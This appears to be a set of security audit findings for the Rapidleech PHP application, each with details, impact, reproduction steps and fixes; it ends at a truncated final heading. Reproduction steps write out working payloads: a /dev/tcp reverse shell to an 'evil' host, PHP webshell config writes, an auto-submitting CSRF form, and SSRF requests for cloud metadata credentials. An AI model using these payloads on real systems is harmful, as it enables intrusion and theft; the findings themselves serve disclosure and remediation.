# Shell command injection in admin run_command action

## Details
The run_command action (admin/index.php:280-287) reads `$cmd = $_POST['command']` with zero sanitization and concatenates `"cd $rootDir && " . $cmd . " 2>&1"` directly into shell_exec(). Combined with default admin/admin and absence of CSRF tokens, any cross-origin POST from a malicious page that the admin visits produces RCE.

## Location
[admin/index.php:283](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L283)

## Impact
Authenticated admin POST yields direct shell execution as the web user.

## Reproduction steps
1. Admin browses to attacker-controlled page that auto-submits a hidden form to /admin/index.php?action=run_command with command=`bash -c "bash -i >& /dev/tcp/evil/4444 0>&1"`. The browser replays cached Basic-Auth credentials, shell_exec runs the payload, attacker gets a reverse shell.

## Recommended fix
Remove run_command entirely; if administrative shell access is required, expose only a fixed allowlist of commands without user-supplied arguments.

---
**Severity:** HIGH
**Status:** Open
**Category:** OS Command Injection
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Arbitrary PHP file write via save_config admin action

## Details
save_config (admin/index.php:267-277) writes `$_POST['config_content']` verbatim to configs/config.php via file_put_contents. The file is included on every request via rl_init.php, so any PHP placed in the body executes on the next page load. save_accounts (admin/index.php:256-265) does the same to configs/accounts.php, which is included by config.php.

## Location
[admin/index.php:271](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L271)

## Impact
Admin POST overwrites configs/config.php with attacker bytes — RCE on next include.

## Reproduction steps
1. Authenticated admin (or CSRF-victim admin) submits POST with config_content=`<?php system($_GET['c']); ?>`. Next request to any page loads rl_init.php → includes configs/config.php → executes the injected PHP.

## Recommended fix
Stop overwriting source PHP files; persist settings to a structured non-executable store (JSON/SQLite) and re-render PHP only via a fixed template; add CSRF tokens.

---
**Severity:** HIGH
**Status:** Open
**Category:** File Upload / Path Manipulation
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Server-side request forgery and header reflection in image proxy

## Details
index.php:28-32 hands `$_GET['image']` to classes/image.php, which parse_url's it and calls geturl() (classes/http.php) with no host/scheme/IP allowlist. The fetched response body is echoed and selected upstream headers are replayed via header() to the client. login_check() is a no-op when login=false (default), so this is reachable unauthenticated.

## Location
[classes/image.php:1](https://github.com/PBhadoo/Rapidleech/blob/main/classes/image.php#L1)

## Impact
Unauthenticated SSRF to internal services plus origin-content injection.

## Reproduction steps
1. Attacker requests `/index.php?image=http://169.254.169.254/latest/meta-data/iam/security-credentials/role/`. Server fetches AWS instance metadata and echoes credentials back in the response. Or `/index.php?image=http://attacker.com/payload.html` with upstream `Content-Type: text/html` reflects attacker HTML on the rapidleech origin (XSS).

## Recommended fix
Restrict proxied URLs to an allowlist of public hosts; block private/link-local/loopback IP ranges; do not reflect upstream Content-Type/Set-Cookie/Location headers.

---
**Severity:** HIGH
**Status:** Open
**Category:** Server-Side Request Forgery
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Command injection in unrar wrapper via attacker-supplied filename

## Details
classes/rar.php:204 and :229 call proc_open with `"\"$file\" \"$dest\""`. `$file` originates from base64_decode($_GET['filestounrar'][i]) and is interpolated unescaped — only wrapped in literal double quotes. An attacker-supplied filename containing `"` plus shell metacharacters breaks out of the quotes and executes arbitrary commands.

## Location
[classes/rar.php:204](https://github.com/PBhadoo/Rapidleech/blob/main/classes/rar.php#L204)

## Impact
RCE through specially-named archive entries during extraction.

## Reproduction steps
1. Attacker submits filestounrar[]=base64('"; touch /tmp/pwned; "') (or constructs a real file under DOWNLOAD_DIR with such a name), triggering the unrar action. proc_open invokes the shell which expands the metacharacters and executes the injected command.

## Recommended fix
Use escapeshellarg() on every argument, or pass an argv array to proc_open instead of a single shell string; canonicalize and validate the path stays under DOWNLOAD_DIR.

---
**Severity:** HIGH
**Status:** Open
**Category:** OS Command Injection
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Server-side request forgery via ajax link checker accepts arbitrary URLs

## Details
ajax.php's linkcheck case parses $_POST['links'], extracts URLs, and calls curl() against each one without restricting scheme, host, or address space. ajax.php does not call login_check(), so this is reachable without authentication regardless of the $options['login'] setting. The fetched response body is returned to the requester, so it is a read SSRF, not just a blind one. Reachable targets include http://127.0.0.1, http://169.254.169.254/latest/meta-data/ on AWS, and internal services on the same host or VPC. Combined with the lack of auth, this is the highest-severity unauthenticated network-internal-access primitive in the application.

## Location
[ajax.php:597](https://github.com/PBhadoo/Rapidleech/blob/main/ajax.php#L597)

## Impact
Unauthenticated attacker forces the server to fetch arbitrary internal or cloud-metadata URLs and read the response.

## Reproduction steps
1. Attacker submits POST /ajax.php with ajax=linkcheck&links=http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server fetches the URL with cURL and returns the response body to the attacker. The attacker harvests cloud instance credentials. Replacing the URL with http://127.0.0.1:6379/ or similar lets the attacker probe arbitrary internal services.

## Recommended fix
Require authentication on ajax.php (call login_check() unconditionally). Restrict URLs accepted by linkcheck to public DNS names whose resolved addresses lie outside RFC1918, link-local, loopback, and cloud-metadata ranges; resolve the host name once and pin the connection to that address to defeat DNS-rebinding. Disallow non-HTTP schemes.

---
**Severity:** HIGH
**Status:** Open
**Category:** SSRF
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Encryption oracle plus unserialize sink yields unauthenticated RCE

## Details
index.php line 187 takes attacker-controlled $_GET['cookie'], encrypts it with the deployment $secretkey via encrypt() (classes/other.php:416-432, Blowfish-CBC, hardcoded IV 'z4c8e7gh', no MAC), and emits the URL-encoded ciphertext into a hidden form input. The same secretkey is reused at line 207 where $_GET['post'] is fed through decrypt(...) and then unserialize() with no allowed_classes and no integrity check. The attacker chains: (1) submit a serialized gadget as ?cookie=, (2) read the rendered ciphertext from the response HTML, (3) resubmit it as ?post= so unserialize executes against attacker-chosen bytes. The application autoloads many classes (pclzip, tar, rar, pcrypt, plus DownloadClass subclasses), giving multiple magic-method gadgets (__destruct/__wakeup/__toString) reachable for file write, file delete, or command execution.

## Location
[index.php:207](https://github.com/PBhadoo/Rapidleech/blob/main/index.php#L207)

## Impact
Unauthenticated attacker triggers arbitrary PHP object instantiation, leading to RCE via gadget chains.

## Reproduction steps
1. Attacker fetches GET /index.php?link=http://example.com/x&cookie=<urlencoded_serialized_payload>. The HTML response contains <input type='hidden' name='cookie' value='ENC' />. Attacker submits GET /index.php?dis_plug=on&host=example.com&path=/x&filename=x&link=http%3A%2F%2Fexample.com%2Fx&post=ENC. The server decrypts ENC and calls unserialize() on attacker-controlled bytes, instantiating gadget objects whose magic methods perform file writes, command execution, or further injection.

## Recommended fix
Never call unserialize() on data that an attacker can influence through a self-encryption oracle. Treat the post parameter as untrusted input by replacing PHP serialization with a typed format such as JSON, validating field shapes, and dropping the encrypt-then-unserialize pattern entirely. If serialization must be retained, separate keys for the input-encryption oracle and the deserialization-decrypt path, add an authenticated MAC over the ciphertext, and pass an allowed_classes list to unserialize.

---
**Severity:** HIGH
**Status:** Open
**Category:** Deserialization
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Default Blowfish secret key shipped in public repository

## Details
`$options['secretkey']` is set to a fixed value (`Evp1dftLD0Gm6bXgjtkd+dFSgNTHr7j6qy1JHgtGSJIC4I7ZwsSkJ3pG`) in the public repo and is the only key used by the Blowfish `encrypt()`/`decrypt()` helpers in `classes/other.php`. Every deployment that did not manually edit this value uses an attacker-known key. The same key protects (a) the `$_GET['post']`/`$_GET['cookie']` envelopes consumed by `index.php`/`audl.php`, (b) stored premium-account credentials in `configs/accounts.php`, and (c) any cookie/state piped through `encrypt()`. There is no warning at install time, no random-key generation, and no rotation mechanism.

## Location
[configs/config.php:1](https://github.com/PBhadoo/Rapidleech/blob/main/configs/config.php#L1)

## Impact
All encrypted state (credentials, cookies, post data) is trivially decryptable by anyone.

## Reproduction steps
1. An attacker reads the secretkey from GitHub, then for every public RapidLeech instance that did not change the default, can decrypt intercepted cookies / encrypted URLs and forge encrypted parameters that the server will accept as authentic. Combined with the unserialize sink in `index.php`, this directly yields RCE.

## Recommended fix
Generate a cryptographically random key on first boot and persist it outside source control. Refuse to start (or print a prominent warning and disable encrypted-state endpoints) when the key matches the shipped default.

---
**Severity:** HIGH
**Status:** Open
**Category:** Use of hard-coded cryptographic key
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Default administrative credentials grant unauthenticated server-side command execution

## Details
default.php ships 'admin_user' => 'admin' and 'admin_pass' => 'admin'. These values populate $options unless an operator overrides them in configs/config.php. The admin panel at admin/index.php gates state-changing operations behind HTTP Basic Auth using exactly those values. Once authenticated, run_command builds a shell string with $cmd = "cd $rootDir && " . $cmd . " 2>&1"; shell_exec($cmd) on the admin/index.php run_command path, and save_config writes raw $_POST['config_content'] to configs/config.php which rl_init.php includes on the next request. Either path is trivially reachable with admin/admin and yields RCE. Many shipped instances will not change defaults given there is no install wizard forcing it.

## Location
[configs/default.php:73](https://github.com/PBhadoo/Rapidleech/blob/main/configs/default.php#L73)

## Impact
Anyone reaching the admin URL with default credentials executes arbitrary shell commands as the web user.

## Reproduction steps
1. Attacker visits https://target/admin/ with HTTP Basic Auth header for admin:admin. Admin UI loads. Attacker POSTs action=run_command&command=id;cat /etc/passwd or POSTs action=save_config&config_content=<?php system($_GET['c']); to drop a webshell into configs/config.php which is included by rl_init.php on the next request. Attacker then retrieves any whitelisted entry point with ?c=id to execute commands.

## Recommended fix
Refuse to start the application until administrator credentials are changed from the shipped defaults; for example, generate a random initial admin password on first run, store its hash, and display it once during install. Do not ship an enabled administrative panel with predictable credentials. Combine this with rate limiting and account lockout on the Basic Auth handler to defeat credential brute-forcing.

---
**Severity:** HIGH
**Status:** Open
**Category:** Authentication
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Unauthenticated AJAX queue endpoint accepts arbitrary URL and filename

## Details
queue_add (lines 436-458) accepts $_POST['url'], $_POST['filename'], $_POST['cookie'], $_POST['referer'] without login_check or any validation. The URL is queued and queue_worker.php (lines 211-216) writes the response to DOWNLOAD_DIR . $download['filename'] with no basename(), no extension allowlist, and no path normalisation. CURLOPT_FOLLOWLOCATION=true and CURLOPT_SSL_VERIFYPEER=false. The forbidden-filetype list applied to user uploads is not consulted here.

## Location
[ajax.php:436](https://github.com/PBhadoo/Rapidleech/blob/main/ajax.php#L436)

## Impact
Server fetches attacker-chosen URL into attacker-named webroot file.

## Reproduction steps
1. POST /ajax.php?ajax=queue_add with url=http://attacker/payload.php and filename=../shell.php (or simply shell.php). queue_worker downloads the body and writes /workspace/Rapidleech/files/shell.php. .htaccess restrictions are scoped to root entry-points, and DOWNLOAD_DIR is web-served. Attacker requests /files/shell.php?c=id and gets RCE.

## Recommended fix
Require authentication and CSRF token; basename() and extension-allowlist the filename; refuse internal/private/loopback IP ranges and non-HTTP(S) schemes for the URL.

---
**Severity:** HIGH
**Status:** Open
**Category:** Server-Side Request Forgery + Arbitrary File Write (CWE-918 / CWE-73)
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# File deletion and rename ignore per-user ownership tokens

## Details
classes/options/delete.php (delete_go, lines 31-47) and classes/options/rename.php (lines 39-73) iterate $_POST['files'] indices, look up entries in $list, and call unlink/rename without comparing the entry's 'owner' field to USER_TOKEN. The dispatcher classes/options.php (lines 30-46) only requires login_check, which is a no-op when 'login'=>false. Even when login is enabled, all logged-in users share a single account, and the per-browser USER_TOKEN that scopes file visibility is never enforced for mutations.

## Location
[classes/options/delete.php:31](https://github.com/PBhadoo/Rapidleech/blob/main/classes/options/delete.php#L31)

## Impact
Any visitor deletes or renames any other user's files.

## Reproduction steps
1. Visitor A reads the global file list (default show_all=true) and learns the integer keys of victim B's entries. A submits POST /index.php?op=delete with files[0]=<B-key>; the file is unlinked and the entry removed from files.lst.

## Recommended fix
Compare $list[$idx]['owner'] === USER_TOKEN before any mutation; reject the request when ownership does not match.

---
**Severity:** HIGH
**Status:** Open
**Category:** Insecure Direct Object Reference (CWE-639)
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Cross-site request forgery on admin actions enables stored RCE against any administrator

## Details
Admin actions (run_command, save_config, save_accounts, install_deno, kill_pid, git_update, update_ytdlp, update_rar) are protected by HTTP Basic Auth only. Browsers automatically replay Basic Auth credentials for the realm once cached, and admin/index.php has no CSRF token (no nonce, no double-submit cookie, no Origin/Referer enforcement, no SameSite cookie because Basic Auth is not cookie-based). An attacker hosts a page that auto-submits a hidden form to https://target/admin/?action=run_command with a chosen command. A logged-in admin visiting the page silently executes the request, which produces RCE. save_config is even worse because it persists a webshell into configs/config.php that survives the admin's session.

## Location
[admin/index.php:1](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L1)

## Impact
Any administrator who visits an attacker-controlled page is forced to execute attacker-chosen shell commands or write attacker-chosen PHP.

## Reproduction steps
1. Attacker hosts https://evil/csrf.html containing <form action='https://target/admin/index.php' method='POST'><input name='action' value='save_config'><input name='config_content' value='<?php system($_GET["c"]); ?>'></form><script>document.forms[0].submit()</script>. A site administrator who has authenticated to the admin panel during the past hour visits evil. Their browser replays Basic Auth, the admin handler writes the webshell, and the attacker then visits any RapidLeech entry point with ?c=id.

## Recommended fix
Require a per-request anti-CSRF token on every state-changing admin action and validate it server-side. Reject requests whose Origin or Referer does not match the configured site. Switch the admin gate from HTTP Basic Auth to a session cookie with SameSite=Strict so cross-site form submissions cannot replay credentials. Combine with re-authentication for the highest-impact actions (save_config, run_command).

---
**Severity:** HIGH
**Status:** Open
**Category:** CSRF
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Authenticated full-tree replacement via git_update admin action

## Details
case 'git_update' accepts $_POST['repo_url'] (regex-validated to https://...) and $_POST['branch'] and runs `git remote set-url origin <url> && git fetch origin <branch> && git reset --hard origin/<branch>`. The regex permits arbitrary attacker-controlled hosts; with full_reset=1 the working tree is overwritten by whatever the attacker repository serves. Subsequent requests execute the attacker's PHP. No CSRF tokens; with default admin/admin this is unauthenticated RCE.

## Location
[admin/index.php:296](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L296)

## Impact
Authenticated attacker replaces every PHP file with attacker-controlled code.

## Reproduction steps
1. Attacker creates a fork of RapidLeech containing a malicious index.php; POSTs repo_url=https://attacker/evil-repo&branch=main&full_reset=1 to /admin/. The next request runs attacker code.

## Recommended fix
Restrict to a hardcoded origin URL (or a static allowlist) and a fixed branch; better, remove the feature and require operators to update via shell.

---
**Severity:** HIGH
**Status:** Open
**Category:** Code Injection
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Public-readable file registry leaks every user's session token

## Details
configs/.htaccess applies `deny from all` then explicitly `<files files.lst>allow from all</files>`. The root .htaccess does not block .lst files. configs/files.lst is a serialized PHP record per line containing 'name' (absolute filesystem path), 'size', 'date', user-supplied 'comment', original source URL, and 'owner' — the user's rl_user_token cookie value (the only credential identifying ownership). USER_TOKEN is a 32-char hex string and the only authenticator for ownership; replaying it as the rl_user_token cookie grants attacker full impersonation.

## Location
[configs/.htaccess:6](https://github.com/PBhadoo/Rapidleech/blob/main/configs/.htaccess#L6)

## Impact
Any internet user reads files.lst to harvest USER_TOKENs and impersonate every other user.

## Reproduction steps
1. Attacker fetches https://target/configs/files.lst, parses serialized lines, picks any victim's owner field, sets the rl_user_token cookie to that value, and sees/controls the victim's files (delete, rename, transload).

## Recommended fix
Remove the allow-from-all on files.lst; serve the registry only via a PHP gateway that authorizes by token. Treat the owner token as a confidential authenticator.

---
**Severity:** HIGH
**Status:** Open
**Category:** Information Disclosure
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# yt-dlp admin authentication cookies disclosed to anonymous users

## Details
ytdlp_universal.php:148-152 reads configs/ytdlp_cookies.txt (where the admin pastes their browser session cookies via admin/index.php's save_ytdlp_cookies handler) into $userCookieContent unconditionally. showFormatSelector() at line 668-684 reads the file again and renders the full contents into a <textarea name='ytdlp_user_cookies'> via htmlspecialchars($existingCookies); line 590-592 also reflects it as a hidden <input> when $this->_userCookieContent is non-empty. Both sinks ship to any unauthenticated visitor who submits a yt-dlp URL.

## Location
[hosts/download/ytdlp_universal.php:684](https://github.com/PBhadoo/Rapidleech/blob/main/hosts/download/ytdlp_universal.php#L684)

## Impact
Anonymous attacker hijacks admin's authenticated session on YouTube/Google/etc.

## Reproduction steps
1. GET /index.php?link=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ. Response HTML contains the admin's __Secure-3PAPISID, __Secure-3PSID, LOGIN_INFO, etc. inside <textarea>. Attacker copies cookies into their browser → hijacks the admin's Google account.

## Recommended fix
Never reflect the admin cookie file content to non-admin users; if a user-supplied cookie is needed, require it per-session and never persist; restrict format-selector access to authenticated admins.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sensitive Information Disclosure
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Limited local file inclusion via upload host parameter

## Details
upload.php builds the include path `HOST_DIR . "upload/$uphost.index.php"` and `HOST_DIR . "upload/$uphost.php"` from `$_REQUEST['uploaded']`. Although `basename()` is applied to strip directory separators, the value is otherwise unchecked, so any pair of files under hosts/upload/ that share a stem can be included. Because hosts/upload/ contains 200+ third-party plugins that import variables into the upload.php scope, attackers can pivot to any plugin's behaviour (selecting alternate destinations, premium-credential leakage, or chaining to other sinks) without going through the intended UI flow. If an extension or operator drops a customised PHP file under hosts/upload/, it becomes silently exposed.

## Location
[upload.php:47](https://github.com/PBhadoo/Rapidleech/blob/main/upload.php#L47)

## Impact
Loads arbitrary uploader plugin pair under hosts/upload

## Reproduction steps
1. Attacker requests POST /upload.php with uploaded=<plugin_stem>&filename=<base64-of-target-file>. upload.php includes /hosts/upload/<plugin_stem>.index.php and /hosts/upload/<plugin_stem>.php. The plugin executes against an attacker-chosen file under DOWNLOAD_DIR, exfiltrating it to an attacker-controlled remote service.

## Recommended fix
Maintain an explicit allowlist of upload-host stems and reject any value not in the list. Apply realpath() and confirm it stays under hosts/upload/.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Local File Inclusion
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Storage failsafe deletes every user's files when disk usage crosses ninety-nine percent

## Details
rl_init.php's check_storage_and_cleanup() runs on every request. When (used / total) >= 99% it walks the entire DOWNLOAD_DIR with RecursiveDirectoryIterator and unlink()s every file (preserving only index.html), then truncates configs/files.lst. The cleanup ignores file ownership (USER_TOKEN), so a user who owns enough data to push the disk past the threshold (or any user co-located on a shared host with low free space) destroys files belonging to every other user of the application. There is no rate limit, no admin-only gate, no per-user quota, and the failsafe runs on every page load including unauthenticated ones.

## Location
[rl_init.php:89](https://github.com/PBhadoo/Rapidleech/blob/main/rl_init.php#L89)

## Impact
Any user who can fill or near-fill the download directory triggers deletion of all other users' files.

## Reproduction steps
1. Attacker submits a download URL pointing to a large file (or repeats many large downloads). Once the disk crosses the 99% threshold, the next page load triggers the cleanup and wipes every other user's downloaded files, including notes.txt, the file registry, and any artifacts the operator was working with. Recovery from this state is impossible.

## Recommended fix
Replace the all-or-nothing cleanup with bounded, ownership-aware eviction (oldest-first within the triggering user's quota first, then lowest-priority files). Enforce per-user disk quotas at upload time so one user cannot fill shared storage. Run the cleanup only from a privileged code path (admin or cron), not on every front-end request.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Authorization
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# User token derived from non-cryptographic randomness allows cross-user file access

## Details
get_user_token() generates the cookie value as md5(uniqid(mt_rand(), true) . REMOTE_ADDR . USER_AGENT). uniqid() returns a microtime-derived prefix plus nine characters of lcg_value() output; mt_rand() is the standard mt19937 PRNG with 32-bit output. Neither is cryptographically secure (PHP documentation explicitly warns). REMOTE_ADDR is shared by NAT'd users and HTTP_USER_AGENT is observable or guessable. An attacker on the same NAT can fingerprint the server's mt_rand state through their own session, then brute-force the residual entropy to mint a victim's token. With $options['show_all'] defaulting to true the privacy boundary is already weak, but ownership-aware actions (deletes, the 'My Uploads' view) remain a valuable target.

## Location
[rl_init.php:63](https://github.com/PBhadoo/Rapidleech/blob/main/rl_init.php#L63)

## Impact
Attacker predicts another user's ownership token and reads or deletes that user's downloaded files.

## Reproduction steps
1. Attacker on a corporate NAT shares REMOTE_ADDR with the victim. Attacker visits the application, observes their own token, and uses it (and known PHP source) to reconstruct the mt_rand internal state. Attacker then guesses the victim's microtime, common UA string, and lcg residue, generating candidate tokens. The attacker installs each candidate as the rl_user_token cookie and views the file list; on a hit, the attacker now sees and can delete the victim's files.

## Recommended fix
Generate the token with random_bytes(16) (or a comparable CSPRNG) and never seed any security-relevant value from mt_rand or uniqid. Treat the cookie as a session identifier and verify it server-side against a stored allowlist of issued tokens, rotating on privilege change.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Authentication
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Notes endpoint writes attacker-controlled content to a world-readable file with no CSRF or ownership check

## Details
notes.php accepts $_POST['notes'] and writes it verbatim with file_put_contents(DOWNLOAD_DIR.basename(lang(327)).'.txt', $_POST['notes']). There is no CSRF token, no per-user namespacing of the file, and login_check() is enforced only when $options['login'] is true (default false). The notes file lives under DOWNLOAD_DIR which is web-accessible (files/) by design. A visitor can clobber any other user's notes, store arbitrary text the operator might trust, or use the predictable URL as a phishing/defacement primitive against subsequent visitors who download the file. Although forbidden_filetypes blocks dangerous extensions, the .txt path bypasses that check entirely because the extension is hardcoded.

## Location
[notes.php:20](https://github.com/PBhadoo/Rapidleech/blob/main/notes.php#L20)

## Impact
Any visitor (including via cross-site form submission) overwrites the shared notes file with arbitrary text.

## Reproduction steps
1. Attacker hosts evil.html with <form action='https://target/notes.php' method='POST'><input name='notes' value='<script>...phish...</script>'></form><script>document.forms[0].submit()</script>. A visitor opens evil.html and the form silently submits to notes.php. The notes file is rewritten. Later legitimate users who navigate to the notes page see the attacker's content; downloading the file delivers the attacker payload as a .txt with the trusted host's name.

## Recommended fix
Require a per-session anti-CSRF token on notes.php and enforce ownership by storing notes under a per-USER_TOKEN path. Validate the Origin/Referer header. Disable the endpoint by default in shared deployments.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** CSRF
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Block cipher uses a fixed initialization vector across every encryption

## Details
pcrypt declares var $iv = "z4c8e7gh";. CBC mode requires a unique IV per encryption to provide semantic security. With a fixed IV, every encrypt(P) produces the same ciphertext for the same P, leaking equality between plaintexts encrypted under the same key. More importantly, when combined with the absence of any MAC (see related finding) and with reuse of the same key for the encryption oracle and the deserialization sink, the fixed IV makes ciphertext-shape analysis trivial and gives an attacker stable building blocks for chosen-ciphertext manipulation.

## Location
[classes/class.pcrypt.php:76](https://github.com/PBhadoo/Rapidleech/blob/main/classes/class.pcrypt.php#L76)

## Impact
Identical plaintexts produce identical ciphertexts, leaking equality and prefixes; combined with the unserialize sink, compounds the deserialization RCE.

## Reproduction steps
1. An operator stores user proxy credentials encrypted with this routine; the attacker harvests cookie values from logs and immediately learns which users share credentials by comparing ciphertexts byte-for-byte. Independently, the predictable IV simplifies the construction of ciphertexts that decrypt to attacker-chosen prefixes when fed to the unserialize sink.

## Recommended fix
Generate a fresh random IV per encryption, prepend it to the ciphertext, and read it back during decryption. Migrate the cryptographic primitive to an authenticated-encryption AEAD (libsodium crypto_secretbox or AES-GCM) so that integrity is not optional, and rotate the master key when the migration is performed.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Cryptography
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Cookies are issued without Secure or SameSite attributes

## Details
rl_init.php sets the rl_user_token cookie with HttpOnly=true but Secure=false and no SameSite attribute. classes/cookie.php sets additional cookies (email, path, proxy, proxyuser, proxypass) with even fewer flags. On any deployment that does not enforce HTTPS at the edge, these cookies travel in cleartext, and on every deployment the absence of SameSite means cross-site requests carry the cookie. Combined with the lack of CSRF tokens on state-changing endpoints, missing SameSite enables cross-site GET attacks against the application; missing Secure exposes the proxy password (proxypass) and the user-token to passive network attackers.

## Location
[rl_init.php:65](https://github.com/PBhadoo/Rapidleech/blob/main/rl_init.php#L65)

## Impact
Session-equivalent and credential cookies are exposed over plaintext HTTP and are replayable in cross-site requests.

## Reproduction steps
1. User connects from a coffee-shop network with mixed HTTPS/HTTP. Attacker on the same network captures a request for an asset over HTTP and harvests rl_user_token and proxypass. With the user-token, attacker accesses the victim's file listing and deletes their files; with proxypass, attacker uses the same authenticated proxy.

## Recommended fix
Set Secure=true, HttpOnly=true, and SameSite=Lax (or Strict for purely first-party cookies) on every cookie issued by the application. Redirect all HTTP traffic to HTTPS in the web server config; emit Strict-Transport-Security with a non-trivial max-age.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Session
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Filename sanitiser does not block PHP-executable extensions

## Details
`fixfilename()` rewrites filenames that match `@\.(((s|\d)?php)|(hta)|(p[l|y])|(cgi)|(sph))@i` to `.xxx`. The pattern catches `.php`, `.sphp`, `.0php`–`.9php`, `.htaccess`, `.pl`, `.py`, `.cgi`, `.sph`, but not `.phar`, `.phtml`, `.pht`, `.phps`, `.module`, `.inc`, `.shtml`, or other extensions that mainstream Apache + `mod_php` configurations execute as PHP. The `files/` directory is web-accessible (users link directly to downloaded files) and the project ships no `.htaccess` in `files/` denying these extensions, so a downloaded `.phar` or `.phtml` lands at a URL that the server will execute.

## Location
[classes/other.php:285](https://github.com/PBhadoo/Rapidleech/blob/main/classes/other.php#L285)

## Impact
Filenames bearing executable PHP extensions reach the web-served files directory.

## Reproduction steps
1. Attacker submits a download whose final filename ends in `.phar` (e.g., from a permitted host that serves the file with that name, or via a redirect). `fixfilename()` leaves the extension intact. The file is saved under `files/`, the attacker requests `https://victim/files/<name>.phar`, and Apache executes the embedded PHP, yielding RCE.

## Recommended fix
Replace the denylist with an allowlist of extensions or, if a denylist must be kept, expand the regex to cover every extension PHP/Apache will execute (`.phar`, `.phtml`, `.pht`, `.php5`, `.phps`, `.module`, `.inc`, `.shtml`). Independently, ship a `.htaccess` in `files/` that disables PHP execution for that directory.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incomplete denylist for dangerous file extensions
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Symlink-based path traversal in tar extractor

## Details
classes/tar.php:1570-1578 calls `@symlink($v_header['link'], $v_header['filename'])` while extracting tar archive entries. _maliciousFilename() (lines 1331-1340) only blocks `/../` and `../` literal prefixes — it does not validate the link target. An attacker tar can therefore drop a symlink that points outside the extraction directory; subsequent reads or writes through that symlink escape the sandbox.

## Location
[classes/tar.php:1572](https://github.com/PBhadoo/Rapidleech/blob/main/classes/tar.php#L1572)

## Impact
Crafted tar archive can read or overwrite arbitrary filesystem paths during extraction.

## Reproduction steps
1. Attacker constructs a tar with a symlink entry where filename=`safe.txt` and link=`/etc/passwd`. After extraction, opening or serving safe.txt reveals system files; a write through the symlink would overwrite /etc/passwd if permissions allow.

## Recommended fix
Skip symlink entries during extraction, or canonicalize the link target and require it remains under the extraction directory.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Path Traversal
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# TLS certificate verification disabled across cURL transfers

## Details
classes/http.php disables CURLOPT_SSL_VERIFYPEER (set to false) at multiple call sites (around lines 540-541, 1116-1117, 1260-1261). Combined with CURLOPT_FOLLOWLOCATION, an MITM attacker can intercept any outbound HTTPS download, present any certificate, and serve modified content — corrupting downloaded files or harvesting cookies sent in subsequent requests to the same host.

## Location
[classes/http.php:540](https://github.com/PBhadoo/Rapidleech/blob/main/classes/http.php#L540)

## Impact
Network attacker can MITM downloads, steal cookies, and inject malicious payloads.

## Reproduction steps
1. Attacker on the same network or with BGP/DNS control intercepts an outbound HTTPS request from rapidleech (e.g., to a file host's API). With cert verification off, the spoofed TLS handshake succeeds and the attacker returns a tampered response (malicious file body, harvest auth cookies in subsequent requests).

## Recommended fix
Enable CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST with the system CA bundle; provide a documented opt-in for legacy hosts only.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Cryptographic Failure
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# HTTP header injection via referer parameter

## Details
readCustomHeaders() (classes/http.php:57-74) splits the user-supplied referer on `\n` and emits each token as a header on the outbound cURL request. No CRLF filtering — attacker injects Authorization, Cookie, or Host headers into requests the server makes on their behalf.

## Location
[classes/http.php:57](https://github.com/PBhadoo/Rapidleech/blob/main/classes/http.php#L57)

## Impact
Smuggle arbitrary outbound headers to bypass auth or poison upstream caches.

## Reproduction steps
1. User-controlled referer value `https://x.com/\nAuthorization: Bearer victimToken` causes geturl() to send the bearer token to attacker-chosen upstream endpoints, exfiltrating credentials or smuggling auth on private APIs.

## Recommended fix
Reject referer values containing CR or LF; build CURLOPT_HTTPHEADER from a structured array, never from raw concatenation.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** HTTP Request Smuggling / Header Injection
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Mail header injection in mail() wrapper

## Details
